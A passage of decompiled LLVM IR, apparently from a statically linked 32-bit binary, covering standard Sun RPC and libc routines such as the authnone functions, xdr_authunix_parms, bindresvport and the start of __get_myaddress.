  br i1 %v1_8058ead, label %dec_label_pc_8058eb5, label %dec_label_pc_8058eaf

dec_label_pc_8058eaf:                             ; preds = %dec_label_pc_8058eaa
  %v2_8058eaf = add i32 %v16_8058eaf, 4
  %v15_8058eaf = and i32 %v2_8058eaf, 255
  %v17_8058eaf = and i32 %v16_8058eaf, -256
  %v18_8058eaf = or i32 %v15_8058eaf, %v17_8058eaf
  store i32 %v18_8058eaf, i32* @edx, align 4
  %v2_8058eb2 = sdiv i32 %v0_8058eb2, 16
  store i32 %v2_8058eb2, i32* @ecx, align 4
  br label %dec_label_pc_8058eb5

dec_label_pc_8058eb5:                             ; preds = %dec_label_pc_8058eaa, %dec_label_pc_8058eaf
  %v16_8058eba = phi i32 [ %v16_8058eaf, %dec_label_pc_8058eaa ], [ %v18_8058eaf, %dec_label_pc_8058eaf ]
  %v0_8058ebd = phi i32 [ %v0_8058eb2, %dec_label_pc_8058eaa ], [ %v2_8058eb2, %dec_label_pc_8058eaf ]
  %v2_8058eb5 = urem i32 %v0_8058ebd, 4
  %v3_8058eb5 = icmp eq i32 %v2_8058eb5, 0
  %v1_8058eb8 = icmp eq i1 %v3_8058eb5, false
  br i1 %v1_8058eb8, label %dec_label_pc_8058ec0, label %dec_label_pc_8058eba

dec_label_pc_8058eba:                             ; preds = %dec_label_pc_8058eb5
  %v2_8058eba = add i32 %v16_8058eba, 2
  %v15_8058eba = and i32 %v2_8058eba, 255
  %v17_8058eba = and i32 %v16_8058eba, -256
  %v18_8058eba = or i32 %v15_8058eba, %v17_8058eba
  store i32 %v18_8058eba, i32* @edx, align 4
  %v2_8058ebd = sdiv i32 %v0_8058ebd, 4
  store i32 %v2_8058ebd, i32* @ecx, align 4
  br label %dec_label_pc_8058ec0

dec_label_pc_8058ec0:                             ; preds = %dec_label_pc_8058eb5, %dec_label_pc_8058eba
  %v0_8058ec9 = phi i32 [ %v16_8058eba, %dec_label_pc_8058eb5 ], [ %v18_8058eba, %dec_label_pc_8058eba ]
  %v0_8058ec6 = phi i32 [ %v0_8058ebd, %dec_label_pc_8058eb5 ], [ %v2_8058ebd, %dec_label_pc_8058eba ]
  %v1_8058ec2 = icmp eq i32 %v0_8058ec6, 0
  br i1 %v1_8058ec2, label %dec_label_pc_8058ed2, label %dec_label_pc_8058ec6

dec_label_pc_8058ec6:                             ; preds = %dec_label_pc_8058ec0
  %v1_8058ec9 = mul i32 %v0_8058ec9, 16777216
  %v2_8058ec9 = sdiv i32 %v1_8058ec9, 16777216
  store i32 %v2_8058ec9, i32* @edx, align 4
  %v1_8058ec6 = urem i32 %v0_8058ec6, 2
  %v1_8058ecc = xor i32 %v1_8058ec6, 1
  %v2_8058ecf = add nsw i32 %v1_8058ecc, %v2_8058ec9
  br label %dec_label_pc_8058ed2

dec_label_pc_8058ed2:                             ; preds = %dec_label_pc_8058ec0, %dec_label_pc_8058ec6
  %v0_8058ed2 = phi i32 [ 0, %dec_label_pc_8058ec0 ], [ %v2_8058ecf, %dec_label_pc_8058ec6 ]
  ret i32 %v0_8058ed2

; uselistorder directives
  uselistorder i32 %v2_8058ec9, { 1, 0 }
  uselistorder i32 %v2_8058ebd, { 1, 0 }
  uselistorder i32 %v0_8058ebd, { 2, 0, 1 }
  uselistorder i32 %v16_8058eba, { 1, 2, 0 }
  uselistorder i32 %v2_8058eb2, { 1, 0 }
  uselistorder i32 %v0_8058eb2, { 2, 0, 1 }
  uselistorder i32 %v16_8058eaf, { 1, 2, 0 }
  uselistorder i32 %v2_8058ea7, { 1, 0 }
  uselistorder i32 %v0_8058ea7, { 1, 0, 2 }
  uselistorder i32 %v16_8058ea4, { 1, 0 }
  uselistorder i32 %v2_8058e9b, { 1, 0 }
  uselistorder i32 %v4_8058e90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058ed2, { 1, 0 }
  uselistorder label %dec_label_pc_8058ec0, { 1, 0 }
  uselistorder label %dec_label_pc_8058eb5, { 1, 0 }
  uselistorder label %dec_label_pc_8058eaa, { 1, 0 }
  uselistorder label %dec_label_pc_8058ea0, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_8058ed4 = load i32, i32* @eax, align 4
  ret i32 %v0_8058ed4
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_8058ede = load i32, i32* @eax, align 4
  ret i32 %v0_8058ede
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8058edf = load i32, i32* @ebx, align 4
  %v1_8058ee3 = call i32 @__rpc_thread_variables(i32 %v0_8058edf)
  %v1_8058eee = add i32 %v1_8058ee3, 152
  %v2_8058eee = inttoptr i32 %v1_8058eee to i32*
  %v3_8058eee = load i32, i32* %v2_8058eee, align 4
  %v1_8058ef4 = icmp eq i32 %v3_8058eee, 0
  br i1 %v1_8058ef4, label %dec_label_pc_8058f0c, label %dec_label_pc_8058ef8

dec_label_pc_8058ef8:                             ; preds = %entry
  %v1_8058ef9 = add i32 %arg1, 4
  %v2_8058ef9 = inttoptr i32 %v1_8058ef9 to i32*
  %v3_8058ef9 = load i32, i32* %v2_8058ef9, align 4
  %v1_8058eff = add i32 %v3_8058eee, 40
  %v5_8058f04 = add i32 %v3_8058ef9, 12
  %v6_8058f04 = inttoptr i32 %v5_8058f04 to i32*
  %v7_8058f04 = load i32, i32* %v6_8058f04, align 4
  call void @__pseudo_call(i32 %v7_8058f04)
  br label %dec_label_pc_8058f0c

dec_label_pc_8058f0c:                             ; preds = %entry, %dec_label_pc_8058ef8
  %v0_8058f0c = phi i32 [ 0, %entry ], [ %v1_8058eff, %dec_label_pc_8058ef8 ]
  ret i32 %v0_8058f0c

; uselistorder directives
  uselistorder label %dec_label_pc_8058f0c, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v0_8058f14 = load i32, i32* @ebx, align 4
  %v1_8058f18 = call i32 @__rpc_thread_variables(i32 %v0_8058f14)
  store i32 %v1_8058f18, i32* %eax.global-to-local, align 4
  %v1_8058f1d = add i32 %v1_8058f18, 152
  %v2_8058f1d = inttoptr i32 %v1_8058f1d to i32*
  %v3_8058f1d = load i32, i32* %v2_8058f1d, align 4
  store i32 %v3_8058f1d, i32* @esi, align 4
  store i32 %v1_8058f18, i32* @ebx, align 4
  %v1_8058f25 = icmp eq i32 %v3_8058f1d, 0
  %v1_8058f27 = icmp eq i1 %v1_8058f25, false
  br i1 %v1_8058f27, label %dec_label_pc_8058f45, label %dec_label_pc_8058f29

dec_label_pc_8058f29:                             ; preds = %entry
  %v5_8058f2f = call i32 @calloc(i64 1, i32 64, i32 %v1_8058f18, i32 %v1_8058f18)
  store i32 %v5_8058f2f, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8058f3b = icmp eq i32 %v5_8058f2f, 0
  br i1 %v1_8058f3b, label %dec_label_pc_8058fba, label %dec_label_pc_8058f3f

dec_label_pc_8058f3f:                             ; preds = %dec_label_pc_8058f29
  %v1_8058f3f = load i32, i32* @ebx, align 4
  %v2_8058f3f = add i32 %v1_8058f3f, 152
  %v3_8058f3f = inttoptr i32 %v2_8058f3f to i32*
  store i32 %v5_8058f2f, i32* %v3_8058f3f, align 4
  %v0_8058f45.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058f45

dec_label_pc_8058f45:                             ; preds = %entry, %dec_label_pc_8058f3f
  %v0_8058f4e = phi i32 [ %v3_8058f1d, %entry ], [ %v0_8058f45.pre, %dec_label_pc_8058f3f ]
  %v1_8058f45 = add i32 %v0_8058f4e, 60
  %v2_8058f45 = inttoptr i32 %v1_8058f45 to i32*
  %v3_8058f45 = load i32, i32* %v2_8058f45, align 4
  %v4_8058f45 = icmp eq i32 %v3_8058f45, 0
  %v1_8058f49 = icmp eq i1 %v4_8058f45, false
  br i1 %v1_8058f49, label %dec_label_pc_8058f45.dec_label_pc_8058fb8_crit_edge, label %dec_label_pc_8058f4b

dec_label_pc_8058f45.dec_label_pc_8058fb8_crit_edge: ; preds = %dec_label_pc_8058f45
  br label %dec_label_pc_8058fb8

dec_label_pc_8058f4b:                             ; preds = %dec_label_pc_8058f45
  %v1_8058f4e = add i32 %v0_8058f4e, 12
  store i32 %v1_8058f4e, i32* @ebx, align 4
  %v3_8058f57 = inttoptr i32 %v1_8058f4e to i16*
  %v4_8058f57 = call i32 @memcpy(i16* %v3_8058f57, i32 ptrtoint (i32* @global_var_8067e20.297 to i32), i32 12)
  store i32 %v4_8058f57, i32* %eax.global-to-local, align 4
  %v0_8058f61 = load i32, i32* @ebx, align 4
  %v0_8058f62 = load i32, i32* @esi, align 4
  %v3_8058f63 = inttoptr i32 %v0_8058f62 to i16*
  %v4_8058f63 = call i32 @memcpy(i16* %v3_8058f63, i32 %v0_8058f61, i32 12)
  %v0_8058f68 = load i32, i32* @esi, align 4
  %v1_8058f68 = add i32 %v0_8058f68, 40
  store i32 %v1_8058f68, i32* %eax.global-to-local, align 4
  %v1_8058f6b = add i32 %v0_8058f68, 32
  %v2_8058f6b = inttoptr i32 %v1_8058f6b to i32*
  store i32 ptrtoint (i32* @global_var_805cfec.333 to i32), i32* %v2_8058f6b, align 4
  %v0_8058f76 = load i32, i32* %eax.global-to-local, align 4
  %v2_8058f77 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8058f77, i32* @edi, align 4
  %v5_8058f7c = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-36, i32 %v0_8058f76, i32 20, i32 0)
  store i32 %v5_8058f7c, i32* %eax.global-to-local, align 4
  %v0_8058f84 = load i32, i32* @esi, align 4
  %v2_8058f86 = call i32 @xdr_opaque_auth(i32 %v2_8058f77, i32 %v0_8058f84)
  store i32 %v0_8058f84, i32* %eax.global-to-local, align 4
  %v0_8058f8d = load i32, i32* @ebx, align 4
  %v2_8058f8f = call i32 @xdr_opaque_auth(i32 %v2_8058f77, i32 %v0_8058f8d)
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v5_8058f9b = add i32 %tmp, 16
  %v6_8058f9b = inttoptr i32 %v5_8058f9b to i32*
  %v7_8058f9b = load i32, i32* %v6_8058f9b, align 4
  call void @__pseudo_call(i32 %v7_8058f9b)
  %v1_8058f9e = load i32, i32* @esi, align 4
  %v2_8058f9e = add i32 %v1_8058f9e, 60
  %v3_8058f9e = inttoptr i32 %v2_8058f9e to i32*
  store i32 %tmp, i32* %v3_8058f9e, align 4
  %v3_8058fa1 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_8058fa1, i32* %eax.global-to-local, align 4
  %v1_8058fa8 = add i32 %v3_8058fa1, 28
  %v2_8058fa8 = inttoptr i32 %v1_8058fa8 to i32*
  %v3_8058fa8 = load i32, i32* %v2_8058fa8, align 4
  store i32 %v3_8058fa8, i32* %eax.global-to-local, align 4
  %v1_8058fab = icmp eq i32 %v3_8058fa8, 0
  br i1 %v1_8058fab, label %dec_label_pc_8058fb8, label %dec_label_pc_8058faf

dec_label_pc_8058faf:                             ; preds = %dec_label_pc_8058f4b
  call void @__pseudo_call(i32 %v3_8058fa8)
  br label %dec_label_pc_8058fb8

dec_label_pc_8058fb8:                             ; preds = %dec_label_pc_8058f45.dec_label_pc_8058fb8_crit_edge, %dec_label_pc_8058f4b, %dec_label_pc_8058faf
  %v0_8058fb8 = load i32, i32* @esi, align 4
  store i32 %v0_8058fb8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058fba

dec_label_pc_8058fba:                             ; preds = %dec_label_pc_8058f29, %dec_label_pc_8058fb8
  %v0_8058fc0 = phi i32 [ 0, %dec_label_pc_8058f29 ], [ %v0_8058fb8, %dec_label_pc_8058fb8 ]
  ret i32 %v0_8058fc0

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 (i64, i32, i32, i32)* @calloc, { 2, 0, 3, 1 }
  uselistorder i64 1, { 2, 3, 4, 0, 1 }
  uselistorder i32 152, { 4, 5, 1, 2, 0, 3, 6, 7 }
  uselistorder label %dec_label_pc_8058fba, { 1, 0 }
  uselistorder label %dec_label_pc_8058fb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058f45, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8058fc4 = load i32, i32* @esi, align 4
  %v0_8058fc5 = load i32, i32* @ebx, align 4
  store i32 %v0_8058fc5, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* @esi, align 4
  %v3_8058fd3 = call i32 @xdr_u_long(i32* %arg1, i32 %arg2)
  %v1_8058fdb = icmp eq i32 %v3_8058fd3, 0
  br i1 %v1_8058fdb, label %dec_label_pc_8059042, label %dec_label_pc_8058fdf

dec_label_pc_8058fdf:                             ; preds = %entry
  %v0_8058fe5 = load i32, i32* @ebx, align 4
  %v1_8058fe5 = add i32 %v0_8058fe5, 4
  %v0_8058fe9 = load i32, i32* @esi, align 4
  %v3_8058fea = inttoptr i32 %v0_8058fe9 to i32*
  %v4_8058fea = call i32 @__GI_xdr_string(i32* %v3_8058fea, i32 %v1_8058fe5, i32 255)
  %v1_8058ff2 = icmp eq i32 %v4_8058fea, 0
  br i1 %v1_8058ff2, label %dec_label_pc_8059042, label %dec_label_pc_8058ff6

dec_label_pc_8058ff6:                             ; preds = %dec_label_pc_8058fdf
  %v0_8058ff8 = load i32, i32* @ebx, align 4
  %v1_8058ff8 = add i32 %v0_8058ff8, 8
  store i32 %v1_8058ff8, i32* @eax, align 4
  %v0_8058ffc = load i32, i32* @esi, align 4
  %v4_8058ffd = inttoptr i32 %v0_8058ffc to i32*
  %v5_8058ffd = call i32 @xdr_u_long(i32* %v4_8058ffd, i32 %v1_8058ff8)
  %v1_8059005 = icmp eq i32 %v5_8058ffd, 0
  br i1 %v1_8059005, label %dec_label_pc_8059042, label %dec_label_pc_8059009

dec_label_pc_8059009:                             ; preds = %dec_label_pc_8058ff6
  %v0_805900b = load i32, i32* @ebx, align 4
  %v1_805900b = add i32 %v0_805900b, 12
  store i32 %v1_805900b, i32* @eax, align 4
  %v0_805900f = load i32, i32* @esi, align 4
  %v4_8059010 = inttoptr i32 %v0_805900f to i32*
  %v5_8059010 = call i32 @xdr_u_long(i32* %v4_8059010, i32 %v1_805900b)
  %v1_8059018 = icmp eq i32 %v5_8059010, 0
  br i1 %v1_8059018, label %dec_label_pc_8059042, label %dec_label_pc_805901c

dec_label_pc_805901c:                             ; preds = %dec_label_pc_8059009
  %v0_805901c = load i32, i32* @ecx, align 4
  %v0_8059027 = load i32, i32* @ebx, align 4
  %v1_8059027 = add i32 %v0_8059027, 16
  %v1_805902b = add i32 %v0_8059027, 20
  %v0_805902f = load i32, i32* @esi, align 4
  %v8_8059030 = inttoptr i32 %v0_805902f to i32*
  %v9_8059030 = call i32 @__GI_xdr_array(i32* %v8_8059030, i32 %v1_805902b, i32 %v1_8059027, i32 16, i32 4, i32 134573851, i32 %v0_805901c, i32 %v0_805901c)
  %v1_8059038 = icmp eq i32 %v9_8059030, 0
  %v1_805903a = icmp eq i1 %v1_8059038, false
  %v2_805903a = zext i1 %v1_805903a to i32
  br label %dec_label_pc_8059044

dec_label_pc_8059042:                             ; preds = %dec_label_pc_8059009, %dec_label_pc_8058ff6, %dec_label_pc_8058fdf, %entry
  br label %dec_label_pc_8059044

dec_label_pc_8059044:                             ; preds = %dec_label_pc_805901c, %dec_label_pc_8059042
  %storemerge = phi i32 [ %v2_805903a, %dec_label_pc_805901c ], [ 0, %dec_label_pc_8059042 ]
  %v2_8059045 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059045, i32* @ebx, align 4
  store i32 %v0_8058fc4, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32, i32)* @__GI_xdr_string, { 1, 0 }
  uselistorder label %dec_label_pc_8059044, { 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-32, align 4
  %v0_805904b = load i32, i32* @ebx, align 4
  %v4_805904f = ptrtoint i16* %arg2 to i32
  store i32 %v4_805904f, i32* @ebx, align 4
  %v1_8059057 = icmp eq i16* %arg2, null
  %v1_8059059 = icmp eq i1 %v1_8059057, false
  br i1 %v1_8059059, label %dec_label_pc_8059076, label %dec_label_pc_805905b

dec_label_pc_805905b:                             ; preds = %entry
  %v2_8059060 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8059060, i32* @ebx, align 4
  %v4_8059065 = bitcast i32* %stack_var_-32 to i8*
  %v5_8059065 = call i32 @__GI_memset(i8* %v4_8059065, i32 0, i32 16)
  store i32 %v5_8059065, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  br label %dec_label_pc_805908f

dec_label_pc_8059076:                             ; preds = %entry
  %v2_8059076 = load i16, i16* %arg2, align 2
  %v11_8059076 = icmp eq i16 %v2_8059076, 2
  br i1 %v11_8059076, label %dec_label_pc_805908f, label %dec_label_pc_805907c

dec_label_pc_805907c:                             ; preds = %dec_label_pc_8059076
  %v1_805907c = call i32 @__errno_location(i32 %v0_805904b)
  %v1_8059081 = inttoptr i32 %v1_805907c to i32*
  store i32 96, i32* %v1_8059081, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059115

dec_label_pc_805908f:                             ; preds = %dec_label_pc_8059076, %dec_label_pc_805905b
  %v0_8059099 = phi i32 [ %tmp8, %dec_label_pc_8059076 ], [ 2, %dec_label_pc_805905b ]
  %v0_805908f = load i16, i16* @global_var_80677ac.334, align 4
  %v1_805908f = icmp eq i16 %v0_805908f, 0
  %v1_8059097 = icmp eq i1 %v1_805908f, false
  br i1 %v1_8059097, label %dec_label_pc_80590b5, label %dec_label_pc_8059099

dec_label_pc_8059099:                             ; preds = %dec_label_pc_805908f
  %v1_8059099 = call i32 @__libc_getpid(i32 %v0_8059099)
  %v2_8059099 = sext i32 %v1_8059099 to i64
  %v2_80590a5 = ashr i32 %v1_8059099, 31
  %v5_80590a6 = zext i32 %v2_80590a5 to i64
  %v6_80590a6 = mul nuw i64 %v5_80590a6, 4294967296
  %v7_80590a6 = or i64 %v6_80590a6, %v2_8059099
  %v9_80590a6 = sdiv i64 %v7_80590a6, 424
  %v10_80590a6 = trunc i64 %v9_80590a6 to i32
  store i32 %v10_80590a6, i32* %eax.global-to-local, align 4
  %v11_80590a6 = srem i64 %v7_80590a6, 424
  %v12_80590a6 = trunc i64 %v11_80590a6 to i32
  %v1_80590a8 = add i32 %v12_80590a6, 600
  store i32 %v1_80590a8, i32* %edx.global-to-local, align 4
  %v1_80590ae = trunc i32 %v1_80590a8 to i16
  store i16 %v1_80590ae, i16* @global_var_80677ac.334, align 4
  %v0_80590b5.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_80590b5

dec_label_pc_80590b5:                             ; preds = %dec_label_pc_805908f, %dec_label_pc_8059099
  %v0_80590b5 = phi i32 [ %v0_8059099, %dec_label_pc_805908f ], [ %v0_80590b5.pre, %dec_label_pc_8059099 ]
  %v1_80590b5 = call i32 @__errno_location(i32 %v0_80590b5)
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v1_80590b5, i32* %edi.global-to-local, align 4
  %v1_80590be = inttoptr i32 %v1_80590b5 to i32*
  store i32 98, i32* %v1_80590be, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805910417 = load i32, i32* %esi.global-to-local, align 4
  %v1_805910418 = add i32 %v0_805910417, -423
  %v6_805910420 = sub i32 422, %v0_805910417
  %v7_805910421 = and i32 %v6_805910420, %v0_805910417
  %v8_805910422 = icmp slt i32 %v7_805910421, 0
  %v9_805910423 = icmp eq i32 %v1_805910418, 0
  %v10_805910424 = icmp slt i32 %v1_805910418, 0
  %v3_805910a25 = icmp eq i1 %v10_805910424, %v8_805910422
  %v4_805910a26 = icmp eq i1 %v9_805910423, false
  %v5_805910a27 = and i1 %v4_805910a26, %v3_805910a25
  br i1 %v5_805910a27, label %dec_label_pc_8059115, label %dec_label_pc_805910c

dec_label_pc_80590c9:                             ; preds = %dec_label_pc_8059110
  %v0_80590c9 = load i16, i16* @global_var_80677ac.334, align 4
  store i32 ashr (i32 shl (i32 ptrtoint (i8* @global_var_80677ad.335 to i32), i32 16), i32 16), i32* %edx.global-to-local, align 4
  %v2_80590d7 = call i16 @llvm.bswap.i16(i16 %v0_80590c9)
  %v3_80590d7 = zext i16 %v2_80590d7 to i32
  store i32 %v3_80590d7, i32* %eax.global-to-local, align 4
  %v2_80590e0 = load i32, i32* @ebx, align 4
  %v3_80590e0 = add i32 %v2_80590e0, 2
  %v4_80590e0 = inttoptr i32 %v3_80590e0 to i16*
  store i16 %v2_80590d7, i16* %v4_80590e0, align 2
  %v0_80590e4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80590e4 = trunc i32 %v0_80590e4 to i16
  %.v1_80590e4 = select i1 icmp sgt (i16 trunc (i32 ashr (i32 shl (i32 ptrtoint (i8* @global_var_80677ad.335 to i32), i32 16), i32 16) to i16), i16 1023), i16 600, i16 %v1_80590e4
  store i16 %.v1_80590e4, i16* @global_var_80677ac.334, align 4
  %v0_80590f6 = load i32, i32* %eax.global-to-local, align 4
  %v0_80590f7 = load i32, i32* %esi.global-to-local, align 4
  %v1_80590f7 = add i32 %v0_80590f7, 1
  store i32 %v1_80590f7, i32* %esi.global-to-local, align 4
  %v0_80590fa = load i32, i32* @ebx, align 4
  %v4_80590fc = call i32 @bind(i32 %v0_80590fa, i32 16, i32 %v0_80590f6)
  store i32 %v4_80590fc, i32* %eax.global-to-local, align 4
  %v1_8059104 = add i32 %v0_80590f7, -422
  %v6_8059104 = sub i32 421, %v0_80590f7
  %v7_8059104 = and i32 %v6_8059104, %v1_80590f7
  %v8_8059104 = icmp slt i32 %v7_8059104, 0
  %v9_8059104 = icmp eq i32 %v1_8059104, 0
  %v10_8059104 = icmp slt i32 %v1_8059104, 0
  %v3_805910a = icmp eq i1 %v10_8059104, %v8_8059104
  %v4_805910a = icmp eq i1 %v9_8059104, false
  %v5_805910a = and i1 %v4_805910a, %v3_805910a
  br i1 %v5_805910a, label %dec_label_pc_8059115, label %dec_label_pc_805910c

dec_label_pc_805910c:                             ; preds = %dec_label_pc_80590b5, %dec_label_pc_80590c9
  %v0_805910c28 = phi i32 [ %v4_80590fc, %dec_label_pc_80590c9 ], [ -1, %dec_label_pc_80590b5 ]
  %v2_805910c = icmp slt i32 %v0_805910c28, 0
  %v1_805910e = icmp eq i1 %v2_805910c, false
  br i1 %v1_805910e, label %dec_label_pc_8059115, label %dec_label_pc_8059110

dec_label_pc_8059110:                             ; preds = %dec_label_pc_805910c
  %v0_8059110 = load i32, i32* %edi.global-to-local, align 4
  %v1_8059110 = inttoptr i32 %v0_8059110 to i32*
  %v2_8059110 = load i32, i32* %v1_8059110, align 4
  %v11_8059110 = icmp eq i32 %v2_8059110, 98
  br i1 %v11_8059110, label %dec_label_pc_80590c9, label %dec_label_pc_8059115

dec_label_pc_8059115:                             ; preds = %dec_label_pc_80590b5, %dec_label_pc_80590c9, %dec_label_pc_805910c, %dec_label_pc_8059110, %dec_label_pc_805907c
  %v0_805911c = phi i32 [ -1, %dec_label_pc_805907c ], [ -1, %dec_label_pc_80590b5 ], [ %v4_80590fc, %dec_label_pc_80590c9 ], [ %v0_805910c28, %dec_label_pc_805910c ], [ %v0_805910c28, %dec_label_pc_8059110 ]
  store i32 %v0_805904b, i32* @ebx, align 4
  ret i32 %v0_805911c

; uselistorder directives
  uselistorder i32 %v1_8059104, { 1, 0 }
  uselistorder i32 %v1_80590b5, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 0, 3, 1, 4, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 98, { 0, 2, 1 }
  uselistorder i64 424, { 1, 0 }
  uselistorder i32 (i32)* @__libc_getpid, { 0, 5, 1, 7, 6, 4, 3, 2 }
  uselistorder i16* @global_var_80677ac.334, { 3, 2, 1, 0 }
  uselistorder i32 96, { 5, 2, 3, 6, 0, 1, 4 }
  uselistorder i16* null, { 1, 0, 2 }
  uselistorder i16* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059115, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_805910c, { 1, 0 }
  uselistorder label %dec_label_pc_80590b5, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_3()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8059120 = load i32, i32* @ebp, align 4
  %v0_8059121 = load i32, i32* @edi, align 4
  %v0_8059122 = load i32, i32* @esi, align 4
  %v0_8059123 = load i32, i32* @ebx, align 4
  store i32 %v0_8059123, i32* %stack_var_-16, align 4
  %v0_805912a = load i32, i32* @eax, align 4
  %v4_8059134 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_805913c = icmp slt i32 %v4_8059134, 0
  store i32 %v4_8059134, i32* @ebp, align 4
  %v1_8059140 = icmp eq i1 %v2_805913c, false
  br i1 %v1_8059140, label %dec_label_pc_805914c, label %dec_label_pc_8059142

dec_label_pc_8059142:                             ; preds = %entry
  br label %dec_label_pc_805918d

dec_label_pc_805914c:                             ; preds = %entry
  %v2_805914c = ptrtoint i32* %stack_var_-4152 to i32
  %v2_8059157 = ptrtoint i32* %stack_var_-24 to i32
  store i32 4096, i32* %stack_var_-24, align 4
  %v0_8059169 = load i32, i32* @ebx, align 4
  %v3_8059171 = call i32 @ioctl(i32 35090, i32 %v2_8059157, i32 %v0_8059169)
  %v2_8059181 = icmp slt i32 %v3_8059171, 0
  %v1_8059183 = icmp eq i1 %v2_8059181, false
  br i1 %v1_8059183, label %dec_label_pc_805919e.preheader, label %dec_label_pc_8059185

dec_label_pc_8059185:                             ; preds = %dec_label_pc_805914c
  br label %dec_label_pc_805918d

dec_label_pc_805918d:                             ; preds = %dec_label_pc_80591d5, %dec_label_pc_8059142, %dec_label_pc_8059185
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1.ph, %dec_label_pc_80591d5 ], [ 1, %dec_label_pc_8059185 ], [ %tmp13, %dec_label_pc_8059142 ]
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80591d5 ], [ %v2_805914c, %dec_label_pc_8059185 ], [ %tmp14, %dec_label_pc_8059142 ]
  %v0_805918d = call i32 @perror()
  %v2_8059199 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_805919e.preheader

dec_label_pc_805919e.preheader:                   ; preds = %dec_label_pc_805918d, %dec_label_pc_805914c
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_805918d ], [ 1, %dec_label_pc_805914c ]
  %stack_var_-20.1.ph = phi i32 [ %stack_var_-20.0, %dec_label_pc_805918d ], [ %v2_805914c, %dec_label_pc_805914c ]
  %v2_80591ae = ptrtoint i32* %stack_var_-56 to i32
  %tmp32 = bitcast i32* %stack_var_-56 to i16*
  %v2_80591e7 = urem i16 %tmp, 2
  %v3_80591e7 = icmp eq i16 %v2_80591e7, 0
  %v4_80591f6 = icmp eq i32 %stack_var_-4164.1.ph, 0
  %v12_8059234 = icmp eq i32 %stack_var_-4164.1.ph, 1
  %v2_80591f2 = and i16 %tmp, 8
  %v3_80591f2 = icmp eq i16 %v2_80591f2, 0
  %v1_80591f4 = icmp eq i1 %v3_80591f2, false
  %v1_80591fb = icmp eq i1 %v4_80591f6, false
  %v1_8059239 = icmp eq i1 %v12_8059234, false
  br label %dec_label_pc_805919e

dec_label_pc_805919e:                             ; preds = %dec_label_pc_8059234, %dec_label_pc_805919e.preheader
  store i32 %stack_var_-20.1.ph, i32* @esi, align 4
  %v3_80591a5 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_80591a5, i32* @edi, align 4
  %v1_805922c3 = icmp eq i32 %v3_80591a5, 0
  %v1_805922e10 = icmp eq i1 %v1_805922c3, false
  br i1 %v1_805922e10, label %dec_label_pc_80591ae, label %dec_label_pc_8059234

dec_label_pc_80591ae:                             ; preds = %dec_label_pc_805919e, %dec_label_pc_8059226
  %v0_80591b8 = phi i32 [ %v1_8059226, %dec_label_pc_8059226 ], [ %stack_var_-20.1.ph, %dec_label_pc_805919e ]
  store i32 %v2_80591ae, i32* @ebx, align 4
  %v0_80591b5 = load i32, i32* @ecx, align 4
